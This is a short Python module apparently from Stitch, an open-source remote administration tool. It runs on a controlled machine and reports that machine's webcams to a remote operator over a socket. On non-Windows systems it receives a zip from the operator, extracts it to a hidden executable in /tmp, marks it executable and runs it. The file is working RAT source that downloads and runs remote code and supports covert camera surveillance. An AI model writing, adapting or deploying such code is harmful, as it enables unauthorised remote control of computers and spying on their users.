# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

if win_client():
    i = 0
    names = ''
    while True:
        try:
            dev = vidcap.new_Dev(i, 0)
            names += '   {}. {}\n'.format(i,dev.getdisplayname())
        except Exception as e:
            if i == 0:
                send(client_socket,"=== Webcam List ===")
                send(client_socket,"   No video devices detected.\n")
                break
            else:
                send(client_socket,"=== Webcam List ===")
                send(client_socket,names)
                break
        else:
            i += 1
else:
    if not os.path.exists('/tmp/.st_imsnp'):
        send(client_socket,'upload_imgsnap')
        current_dir = os.getcwd()
        temp = '/tmp/'
        dwld_contents = ''
        l_filename = receive(client_socket)
        if l_filename != 'ERROR':
            d_fin = ''
            zip_loc = os.path.join(temp,l_filename)
            with open (zip_loc,'wb') as load_file:
                while True:
                    d_fin = receive(client_socket)
                    if d_fin != 'upload complete':
                        load_file.write(d_fin)
                    else:
                        break
            with zipfile.ZipFile(zip_loc, "r") as z:
                z.extractall(temp)
            os.remove(zip_loc)
            send(client_socket,'[+] Upload Successful!\n')
    else:
        send(client_socket,'st_continue')
    run_command('chmod +x /tmp/.st_imsnp')
    cam_list = run_command('/tmp/.st_imsnp -l')
    send(client_socket,"=== Webcam List ===")
    send(client_socket,cam_list)
